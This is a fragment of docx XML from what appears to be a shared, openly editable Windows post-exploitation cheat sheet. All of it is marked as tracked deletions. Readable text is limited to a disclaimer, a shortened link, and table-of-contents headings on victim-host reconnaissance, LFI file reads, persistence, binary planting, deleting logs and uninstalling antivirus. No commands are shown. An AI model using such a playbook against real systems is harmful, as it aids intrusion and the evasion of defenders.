              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">File-&gt;Download As method</w:delText>
        </w:r>
      </w:del>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sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">If you are viewing this on anything other than Google Docs then you can get</w:delText>
        </w:r>
      </w:del>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sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and Windows here</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">:</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:color w:val="000099"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:color w:val="000099"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:u w:val="single"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">http://bit.ly/nuc0N0</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">/</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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jc w:val="center"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="000099"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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jc w:val="right"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="ff0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="ff0000"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:color w:val="ff0000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:color w:val="ff0000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">DISCLAIMER: Anyone can edit these docs, and all that entails and implies</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000069A">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ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_kbdh3njycv5v" w:id="244"/>
        <w:bookmarkEnd w:id="244"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000069B">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ind w:left="720" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Courier New" w:cs="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:rFonts w:ascii="Courier New" w:cs="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:author="" w:id="0">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ind w:left="720" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_y5w9p7e0yt0f" w:id="245"/>
        <w:bookmarkEnd w:id="245"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:br w:type="page"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000069C">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:spacing w:after="120" w:before="480" w:lineRule="auto"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_bi95dtsgp7cp" w:id="246"/>
        <w:bookmarkEnd w:id="246"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000069D">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="James Curbow" w:id="17" w:date="2019-10-23T02:11:26Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:u w:val="single"/>
              <w:rtl w:val="0"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr/>
              </w:rPrChange>
            </w:rPr>
            <w:delText xml:space="preserve">zz</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_dvy2544x9nea" w:id="247"/>
        <w:bookmarkEnd w:id="247"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Table of Contents </w:delText>
        </w:r>
      </w:del>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200" w:lineRule="auto"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="000099"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique w:val="1"/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtContent>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ind w:left="360" w:firstLine="0"/>
            <w:rPr>
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
              <w:color w:val="1155cc"/>
              <w:u w:val="single"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr>
                  <w:color w:val="1155cc"/>
                  <w:u w:val="single"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:fldChar w:fldCharType="begin"/>
            <w:instrText xml:space="preserve"> TOC \h \u \z \n </w:instrText>
            <w:fldChar w:fldCharType="separate"/>
          </w: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Presence</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Blind Files</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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System</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Networking (ipconfig, netstat, net)</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Configs</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Finding Important Files</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Files To Pull (if possible)</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Remote System Access</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Auto-Start Directories</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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ind w:left="36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Persistance</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>
        </w:p>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Binary Planting</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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WMI</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Reg Command exit</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Deleting Logs</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Uninstalling Software “AntiVirus” (Non interactive)</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>
        </w:p>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 Other  (to be sorted)</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>
        </w:p>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ind w:left="108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Vista/7</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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ind w:left="108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Vista SP1/7/2008/2008R2 (x86 &amp; x64)</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Invasive or Altering Commands</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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Support Tools Binaries / Links / Usage</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>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ind w:left="720" w:firstLine="0"/>
            <w:rPr>
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
              <w:color w:val="1155cc"/>
              <w:u w:val="single"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr>
                  <w:color w:val="1155cc"/>
                  <w:u w:val="single"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
          </w:pPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:color w:val="1155cc"/>
                <w:u w:val="single"/>
                <w:rtl w:val="0"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:color w:val="1155cc"/>
                    <w:u w:val="single"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:delText xml:space="preserve">Third Party Portable Tools</w:delText>
            </w:r>
            <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
              <w:rPr>
                <w:rtl w:val="0"/>
              </w:rPr>
            </w:r>
          </w:del>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>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color w:val="000099"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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200"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rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006B7">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bookmarkStart w:colFirst="0" w:colLast="0" w:name="_c6hzyag2acqo" w:id="248"/>
        <w:bookmarkEnd w:id="248"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006B8">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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="000099"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_zf85wt7p54kk" w:id="249"/>
        <w:bookmarkEnd w:id="249"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006B9">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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="000099"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_240ri25099wf" w:id="250"/>
        <w:bookmarkEnd w:id="250"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006BA">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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:color w:val="000099"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_uv3efbjgl1zo" w:id="251"/>
        <w:bookmarkEnd w:id="251"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006BB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_nt7wftrgkiv4" w:id="252"/>
        <w:bookmarkEnd w:id="252"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Presence</w:delText>
        </w:r>
      </w:del>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This section focuses on information gathering about the victim host and the network that it’s attached to.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000006BD">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5lzvjo8g72te" w:id="253"/>
        <w:bookmarkEnd w:id="253"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Blind Files</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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(Things to pull when all you can do is to blindly read) LFI/Directory traversal(s) or remote file share instances like SMB</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">/FTP/NFS or otherwise.</w:delText>
        </w:r>
